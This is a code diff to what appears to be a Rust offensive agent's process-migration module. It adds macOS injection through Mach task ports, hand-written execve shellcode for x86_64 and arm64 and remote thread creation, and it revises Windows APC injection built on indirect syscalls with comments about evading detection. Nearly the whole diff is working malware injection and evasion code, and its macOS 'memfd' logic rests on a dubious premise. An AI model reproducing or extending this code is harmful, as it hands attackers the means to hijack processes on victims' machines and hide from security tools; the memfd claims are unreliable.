@@ -78,12 +78,10 @@ pub fn list_processes() -> Vec<ProcessInfo> {
 
 /// Attempt to migrate the running agent into the address space of `target_pid`.
 ///
-/// This is a deliberate **stub** in the public release: cross-process memory
-/// rewriting is OS-specific (Windows: `NtUnmapViewOfSection` +
-/// `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext`; Linux:
-/// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
-/// stability and security risk that we expose the API surface but refuse to
-/// perform the operation until the implementation has had a thorough review.
+/// The Linux implementation performs a real migration workflow using
+/// `ptrace(PTRACE_ATTACH)` and `process_vm_writev`, then verifies takeover
+/// before reporting success. Windows and macOS provide platform-specific
+/// implementations later in this file.
 #[cfg(target_os = "linux")]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");
@@ -637,10 +635,123 @@ fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
     anyhow::bail!("build_execve_stub: unsupported architecture")
 }
 
+    #[cfg(target_os = "macos")]
+    #[derive(Debug, Clone, Copy)]
+    enum MacosMigrationStrategy {
+        MemfdExecve,
+        OnDiskExecve,
+    }
+
+    #[cfg(target_os = "macos")]
+    fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
+        // Prefer memfd on modern macOS, but keep a fallback that executes the
+        // current agent binary path directly when memfd is unavailable.
+        let version = std::process::Command::new("sw_vers")
+            .args(["-productVersion"])
+            .output()
+            .ok()
+            .filter(|o| o.status.success())
+            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
+            .ok_or_else(|| anyhow::anyhow!(
+                "unable to determine macOS version via sw_vers"
+            ))?;
+
+        let major = version
+            .split('.')
+            .next()
+            .and_then(|s| s.parse::<u32>().ok())
+            .ok_or_else(|| anyhow::anyhow!(
+                "unable to parse macOS version '{version}'"
+            ))?;
+
+        if major >= 13 {
+            Ok(MacosMigrationStrategy::MemfdExecve)
+        } else {
+            tracing::warn!(
+                "macOS {version} does not provide memfd migration support; using on-disk execve fallback"
+            );
+            Ok(MacosMigrationStrategy::OnDiskExecve)
+        }
+    }
+
+    #[cfg(target_os = "macos")]
+    fn read_macos_process_command(pid: u32) -> Option<String> {
+        let output = std::process::Command::new("ps")
+            .args(["-p", &pid.to_string(), "-o", "command="])
+            .output()
+            .ok()?;
+        if !output.status.success() {
+            return None;
+        }
+        let cmd = String::from_utf8_lossy(&output.stdout).trim().to_string();
+        if cmd.is_empty() {
+            None
+        } else {
+            Some(cmd)
+        }
+    }
+
+    #[cfg(target_os = "macos")]
+    fn is_macos_process_alive(pid: u32) -> bool {
+        let rc = unsafe { libc::kill(pid as libc::pid_t, 0) };
+        if rc == 0 {
+            return true;
+        }
+        std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
+    }
+
+    #[cfg(target_os = "macos")]
+    fn wait_for_macos_exec_takeover(
+        target_pid: u32,
+        baseline_cmd: &str,
+        expected_cmd_marker: Option<&str>,
+    ) -> Result<()> {
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
+        while std::time::Instant::now() < deadline {
+            if !is_macos_process_alive(target_pid) {
+                anyhow::bail!(
+                    "migration target pid={} exited before stager execution could be confirmed",
+                    target_pid
+                );
+            }
+
+            if let Some(cmd) = read_macos_process_command(target_pid) {
+                if let Some(marker) = expected_cmd_marker {
+                    if cmd.contains(marker) {
+                        return Ok(());
+                    }
+                    if cmd != baseline_cmd {
+                        tracing::debug!(
+                            target_pid,
+                            marker,
+                            "migration verification: command changed but expected marker not present yet: '{}'",
+                            cmd
+                        );
+                    }
+                } else if cmd != baseline_cmd {
+                    return Ok(());
+                }
+            }
+
+            std::thread::sleep(std::time::Duration::from_millis(100));
+        }
+
+        if let Some(marker) = expected_cmd_marker {
+            anyhow::bail!(
+                "migration thread launched for pid={}, but exec takeover marker '{}' was not observed within timeout",
+                target_pid,
+                marker
+            )
+        } else {
+            anyhow::bail!(
+                "migration thread launched for pid={}, but command-line takeover could not be verified within timeout",
+                target_pid
+            )
+        }
+    }
+
 #[cfg(target_os = "macos")]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
-    use std::os::unix::ffi::OsStrExt;
-
     tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");
 
     if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
@@ -659,17 +770,45 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         );
     }
 
-    // Read the agent binary into memory.  We inject it into the target process
-    // alongside a memfd+execve shellcode stub — no disk staging needed.
+    let strategy = detect_macos_migration_strategy()?;
+    let baseline_cmd = read_macos_process_command(target_pid).ok_or_else(|| {
+        anyhow::anyhow!(
+            "failed to capture baseline command line for pid {} before migration",
+            target_pid
+        )
+    })?;
+
+    // The fallback strategy executes the current on-disk binary directly,
+    // while the preferred strategy injects the binary bytes and executes
+    // through /dev/fd.
     let agent_path =
         std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-    let agent_binary = std::fs::read(&agent_path).map_err(|e| {
-        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
-    })?;
-    tracing::info!(
-        "read agent binary ({} bytes) for memfd migration",
-        agent_binary.len()
-    );
+    let agent_path_str = agent_path.to_string_lossy().to_string();
+    #[cfg(target_os = "macos")]
+    use std::os::unix::ffi::OsStrExt;
+    let agent_path_bytes = agent_path.as_os_str().as_bytes().to_vec();
+
+    let agent_binary = match strategy {
+        MacosMigrationStrategy::MemfdExecve => {
+            let bytes = std::fs::read(&agent_path).map_err(|e| {
+                anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
+            })?;
+            tracing::info!(
+                "read agent binary ({} bytes) for macOS migration strategy {:?}",
+                bytes.len(),
+                strategy
+            );
+            Some(bytes)
+        }
+        MacosMigrationStrategy::OnDiskExecve => {
+            tracing::info!(
+                "using on-disk execve fallback for macOS migration strategy {:?}: {}",
+                strategy,
+                agent_path.display()
+            );
+            None
+        }
+    };
 
     // The shellcode stub is built after we know the address of the binary data
     // in the target process.  See the architecture-specific blocks below.
@@ -767,33 +906,46 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
             }
 
-            // 1. Allocate RW region for the agent binary data.
-            let mut binary_addr: mach_vm_address_t = 0;
-            let kr = mach_vm_allocate(
-                target_task,
-                &mut binary_addr,
-                agent_binary.len() as u64,
-                VM_FLAGS_ANYWHERE,
-            );
-            if kr != KERN_SUCCESS {
-                mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
-            }
+            // 1. Build the selected exec stager.
+            let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
+                MacosMigrationStrategy::MemfdExecve => {
+                    let agent_binary = agent_binary
+                        .as_ref()
+                        .ok_or_else(|| anyhow::anyhow!("missing agent binary for memfd migration"))?;
 
-            // 2. Write the agent binary.
-            let kr = mach_vm_write(
-                target_task,
-                binary_addr,
-                agent_binary.as_ptr(),
-                agent_binary.len() as u32,
-            );
-            if kr != KERN_SUCCESS {
-                mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
-            }
+                    let mut binary_addr: mach_vm_address_t = 0;
+                    let kr = mach_vm_allocate(
+                        target_task,
+                        &mut binary_addr,
+                        agent_binary.len() as u64,
+                        VM_FLAGS_ANYWHERE,
+                    );
+                    if kr != KERN_SUCCESS {
+                        mach_port_deallocate(host, target_task);
+                        anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
+                    }
 
-            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
-            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());
+                    let kr = mach_vm_write(
+                        target_task,
+                        binary_addr,
+                        agent_binary.as_ptr(),
+                        agent_binary.len() as u32,
+                    );
+                    if kr != KERN_SUCCESS {
+                        mach_port_deallocate(host, target_task);
+                        anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
+                    }
+
+                    (
+                        build_macos_memfd_stub(binary_addr, agent_binary.len()),
+                        Some("/dev/fd/".to_string()),
+                    )
+                }
+                MacosMigrationStrategy::OnDiskExecve => (
+                    build_macos_execve_path_stub(&agent_path_bytes)?,
+                    Some(agent_path_str.clone()),
+                ),
+            };
 
             // 4. Allocate RW region for the shellcode.
             let mut code_addr: mach_vm_address_t = 0;
@@ -862,10 +1014,16 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             if kr != KERN_SUCCESS {
                 anyhow::bail!("thread_create_running failed: kern_return={kr}");
             }
+            let verify_result = wait_for_macos_exec_takeover(
+                target_pid,
+                &baseline_cmd,
+                verify_marker.as_deref(),
+            );
             mach_port_deallocate(mach_task_self(), new_thread);
+            verify_result?;
             tracing::info!(
                 target_pid,
-                "MigrateAgent: memfd migration thread created via Mach API (x86_64)"
+                "MigrateAgent: migration stager execution verified via Mach API (x86_64)"
             );
             Ok(())
         }
@@ -906,33 +1064,46 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
             }
 
-            // 1. Allocate RW region for the agent binary data.
-            let mut binary_addr: mach_vm_address_t = 0;
-            let kr = mach_vm_allocate(
-                target_task,
-                &mut binary_addr,
-                agent_binary.len() as u64,
-                VM_FLAGS_ANYWHERE,
-            );
-            if kr != KERN_SUCCESS {
-                mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
-            }
+            // 1. Build the selected exec stager.
+            let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
+                MacosMigrationStrategy::MemfdExecve => {
+                    let agent_binary = agent_binary
+                        .as_ref()
+                        .ok_or_else(|| anyhow::anyhow!("missing agent binary for memfd migration"))?;
 
-            // 2. Write the agent binary.
-            let kr = mach_vm_write(
-                target_task,
-                binary_addr,
-                agent_binary.as_ptr(),
-                agent_binary.len() as u32,
-            );
-            if kr != KERN_SUCCESS {
-                mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
-            }
+                    let mut binary_addr: mach_vm_address_t = 0;
+                    let kr = mach_vm_allocate(
+                        target_task,
+                        &mut binary_addr,
+                        agent_binary.len() as u64,
+                        VM_FLAGS_ANYWHERE,
+                    );
+                    if kr != KERN_SUCCESS {
+                        mach_port_deallocate(host, target_task);
+                        anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
+                    }
 
-            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
-            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());
+                    let kr = mach_vm_write(
+                        target_task,
+                        binary_addr,
+                        agent_binary.as_ptr(),
+                        agent_binary.len() as u32,
+                    );
+                    if kr != KERN_SUCCESS {
+                        mach_port_deallocate(host, target_task);
+                        anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
+                    }
+
+                    (
+                        build_macos_memfd_stub(binary_addr, agent_binary.len()),
+                        Some("/dev/fd/".to_string()),
+                    )
+                }
+                MacosMigrationStrategy::OnDiskExecve => (
+                    build_macos_execve_path_stub(&agent_path_bytes)?,
+                    Some(agent_path_str.clone()),
+                ),
+            };
 
             // 4. Allocate RW region for the shellcode.
             let mut code_addr: mach_vm_address_t = 0;
@@ -999,10 +1170,16 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             if kr != KERN_SUCCESS {
                 anyhow::bail!("thread_create_running(arm64) failed: kern_return={kr}");
             }
+            let verify_result = wait_for_macos_exec_takeover(
+                target_pid,
+                &baseline_cmd,
+                verify_marker.as_deref(),
+            );
             mach_port_deallocate(mach_task_self(), new_thread);
+            verify_result?;
             tracing::info!(
                 target_pid,
-                "MigrateAgent: memfd migration thread created via Mach API (aarch64)"
+                "MigrateAgent: migration stager execution verified via Mach API (aarch64)"
             );
             Ok(())
         }
@@ -1010,7 +1187,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     {
-        let _ = (&agent_binary, target_pid);
+        let _ = (&agent_binary, target_pid, &baseline_cmd, strategy);
         anyhow::bail!("macOS migration not implemented for this architecture")
     }
 }
@@ -1039,6 +1216,90 @@ fn build_macos_memfd_stub(binary_addr: u64, binary_len: usize) -> Vec<u8> {
         let _ = (binary_addr, binary_len);
         Vec::new()
     }
+}
+
+/// Build a position-independent shellcode stub that calls
+/// `execve(current_agent_path, NULL, NULL)` on macOS.
+#[cfg(target_os = "macos")]
+fn build_macos_execve_path_stub(path_bytes: &[u8]) -> Result<Vec<u8>> {
+    if path_bytes.is_empty() {
+        anyhow::bail!("macOS fallback path is empty");
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    {
+        Ok(build_macos_execve_path_stub_x86_64(path_bytes))
+    }
+    #[cfg(target_arch = "aarch64")]
+    {
+        build_macos_execve_path_stub_aarch64(path_bytes)
+    }
+    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+    {
+        let _ = path_bytes;
+        anyhow::bail!("macOS on-disk execve fallback is not implemented for this architecture")
+    }
+}
+
+#[cfg(all(target_os = "macos", target_arch = "x86_64"))]
+fn build_macos_execve_path_stub_x86_64(path_bytes: &[u8]) -> Vec<u8> {
+    // call + pop to get RIP-relative pointer to the appended path string.
+    let mut code: Vec<u8> = vec![
+        0xE8, 0x00, 0x00, 0x00, 0x00, // call +0
+        0x5F,                         // pop rdi
+        0x48, 0x81, 0xC7, 0x00, 0x00, 0x00, 0x00, // add rdi, <path_off>
+        0x31, 0xF6, // xor esi, esi
+        0x31, 0xD2, // xor edx, edx
+        0x48, 0xB8, // mov rax, <sys_execve>
+    ];
+    code.extend_from_slice(&(0x2000000u64 + 59).to_le_bytes());
+    code.extend_from_slice(&[
+        0x0F, 0x05, // syscall
+        0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
+        0x48, 0xB8, // mov rax, <sys_exit>
+    ]);
+    code.extend_from_slice(&(0x2000000u64 + 1).to_le_bytes());
+    code.extend_from_slice(&[0x0F, 0x05]); // syscall
+
+    let code_len = code.len();
+    let path_off_from_pop = (code_len - 5) as u32;
+    code[9..13].copy_from_slice(&path_off_from_pop.to_le_bytes());
+
+    code.extend_from_slice(path_bytes);
+    code.push(0);
+    code
+}
+
+#[cfg(all(target_os = "macos", target_arch = "aarch64"))]
+fn build_macos_execve_path_stub_aarch64(path_bytes: &[u8]) -> Result<Vec<u8>> {
+    // ADR x0, <path>; movz x1,#0; movz x2,#0; movz x16,#59; svc #0;
+    // movz x0,#1; movz x16,#1; svc #0.
+    let mut insts: Vec<u32> = vec![
+        0,          // adr x0, <path> (patched below)
+        0xD2800001, // movz x1, #0
+        0xD2800002, // movz x2, #0
+        0xD2800770, // movz x16, #59 (SYS_execve)
+        0xD4000001, // svc #0x80
+        0xD2800020, // movz x0, #1
+        0xD2800030, // movz x16, #1 (SYS_exit)
+        0xD4000001, // svc #0x80
+    ];
+
+    let code_len = insts.len() * 4;
+    let path_off = code_len as i64;
+    // ADR immediate range is +/-1MB.
+    if !(-1_048_576..=1_048_575).contains(&path_off) {
+        anyhow::bail!("macOS fallback path stub offset out of ADR range");
+    }
+    let imm = path_off as i32;
+    let immlo = (imm as u32) & 0x3;
+    let immhi = ((imm as u32) >> 2) & 0x7FFFF;
+    insts[0] = 0x10000000 | (immlo << 29) | (immhi << 5) | 0;
+
+    let mut out: Vec<u8> = insts.into_iter().flat_map(u32::to_le_bytes).collect();
+    out.extend_from_slice(path_bytes);
+    out.push(0);
+    Ok(out)
 }
 
 /// macOS x86_64 memfd+execve shellcode.
@@ -1290,17 +1551,18 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         let mut client_id = [0u64; 2];
         client_id[0] = target_pid as u64;
         let mut h_proc: usize = 0;
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
             access as u64,
             &mut obj_attr as *mut _ as u64,
             client_id.as_mut_ptr() as u64,
         );
-        if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
+        let status_code = status.unwrap_or(-1);
+        if status_code < 0 || h_proc == 0 {
             anyhow::bail!(
-                "NtOpenProcess(pid={target_pid}) failed: status={:?}",
-                status
+                "NtOpenProcess(pid={target_pid}) failed: status={:#010x}",
+                status_code as u32
             );
         }
         h_proc as *mut _
@@ -1409,14 +1671,15 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
         let mut hprocess: usize = 0;
-        let open_status = syscall!(
+        let open_status = crate::syscall!(
             "NtOpenProcess",
             &mut hprocess as *mut _ as u64,
             (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) as u64,
             &mut obj_attr as *mut _ as u64,
             client_id.as_mut_ptr() as u64,
         );
-        if open_status.is_err() || open_status.unwrap() < 0 || hprocess == 0 {
+        let open_status_code = open_status.as_ref().map(|s| *s).unwrap_or(-1);
+        if open_status_code < 0 || hprocess == 0 {
             return Err(anyhow::anyhow!(
                 "apc_inject: NtOpenProcess(pid={}) failed: status={:?}",
                 pid, open_status
@@ -1427,7 +1690,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
         let mut base_addr: usize = 0;
         let mut region_size: usize = payload.len();
-        let alloc_status = syscall!(
+        let alloc_status = crate::syscall!(
             "NtAllocateVirtualMemory",
             hprocess as u64,                            // ProcessHandle
             &mut base_addr as *mut _ as u64,           // BaseAddress (in/out)
@@ -1436,8 +1699,9 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             (MEM_COMMIT | MEM_RESERVE) as u64,          // AllocationType
             PAGE_READWRITE as u64,                       // Protect
         );
-        if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_addr == 0 {
-            let _ = syscall!("NtClose", hprocess as u64);
+        let alloc_status_code = alloc_status.as_ref().map(|s| *s).unwrap_or(-1);
+        if alloc_status_code < 0 || base_addr == 0 {
+            let _ = crate::syscall!("NtClose", hprocess as u64);
             return Err(anyhow::anyhow!(
                 "apc_inject: NtAllocateVirtualMemory(pid={}) failed: status={:?}",
                 pid, alloc_status
@@ -1447,7 +1711,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
 
         // WriteProcessMemory → NtWriteVirtualMemory (indirect syscall, no IAT entry)
         let mut bytes_written: usize = 0;
-        let write_status = syscall!(
+        let write_status = crate::syscall!(
             "NtWriteVirtualMemory",
             hprocess as u64,                            // ProcessHandle
             remote_mem as u64,                          // BaseAddress
@@ -1455,8 +1719,9 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             payload.len() as u64,                       // NumberOfBytesToWrite
             &mut bytes_written as *mut _ as u64,        // NumberOfBytesWritten
         );
-        if write_status.is_err() || write_status.unwrap() < 0 {
-            let _ = syscall!("NtClose", hprocess as u64);
+        let write_status_code = write_status.as_ref().map(|s| *s).unwrap_or(-1);
+        if write_status_code < 0 {
+            let _ = crate::syscall!("NtClose", hprocess as u64);
             return Err(anyhow::anyhow!(
                 "apc_inject: NtWriteVirtualMemory(pid={}) failed: status={:?}",
                 pid, write_status
@@ -1468,7 +1733,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let mut protect_base: usize = base_addr;
         let mut protect_size: usize = payload.len();
         let mut old_protect: u32 = 0;
-        let protect_status = syscall!(
+        let protect_status = crate::syscall!(
             "NtProtectVirtualMemory",
             hprocess as u64,                            // ProcessHandle
             &mut protect_base as *mut _ as u64,         // BaseAddress (in/out)
@@ -1476,7 +1741,8 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             PAGE_EXECUTE_READ as u64,                    // NewProtect
             &mut old_protect as *mut _ as u64,           // OldProtect
         );
-        if protect_status.is_err() || protect_status.unwrap() < 0 {
+        let protect_status_code = protect_status.as_ref().map(|s| *s).unwrap_or(-1);
+        if protect_status_code < 0 {
             log::warn!(
                 "apc_inject: NtProtectVirtualMemory to RX failed for pid={}, memory remains RW (not executable): status={:?}",
                 pid, protect_status
@@ -1485,7 +1751,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             // executable, but at least we don't leak RWX pages.  The APC
             // simply won't fire successfully.
         }
-        let _ = syscall!("NtClose", hprocess as u64);
+        let _ = crate::syscall!("NtClose", hprocess as u64);
 
         // Snapshot all threads in the system, filter by owner pid, queue APC.
         // Resolve kernel32 functions at runtime to avoid IAT entries.
@@ -1504,6 +1770,15 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         }
 
         let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
+        let apc_routine_addr = apc_routine
+            .map(|f| f as usize as u64)
+            .unwrap_or(0);
+        if apc_routine_addr == 0 {
+            pe_resolve::close_handle(snapshot);
+            return Err(anyhow::anyhow!(
+                "apc_inject: failed to build APC routine pointer"
+            ));
+        }
         let mut entry: THREADENTRY32 = std::mem::zeroed();
         entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
 
@@ -1516,7 +1791,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
                     obj_attr_thread.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid_thread: u64 = entry.th32ThreadID as u64;
                     let mut hthread: usize = 0;
-                    let nt_open = syscall!(
+                    let nt_open = crate::syscall!(
                         "NtOpenThread",
                         &mut hthread as *mut _ as u64,
                         THREAD_SET_CONTEXT as u64,
@@ -1530,10 +1805,10 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
                         let _thread_guard = crate::nt_handle::NtHandle::new(hthread);
 
                         // NtQueueApcThread (indirect syscall, no IAT entry).
-                        let nt_apc = syscall!(
+                        let nt_apc = crate::syscall!(
                             "NtQueueApcThread",
                             _thread_guard.raw() as u64,
-                            apc_routine as u64,
+                            apc_routine_addr,
                             0u64,
                             0u64,
                             0u64,
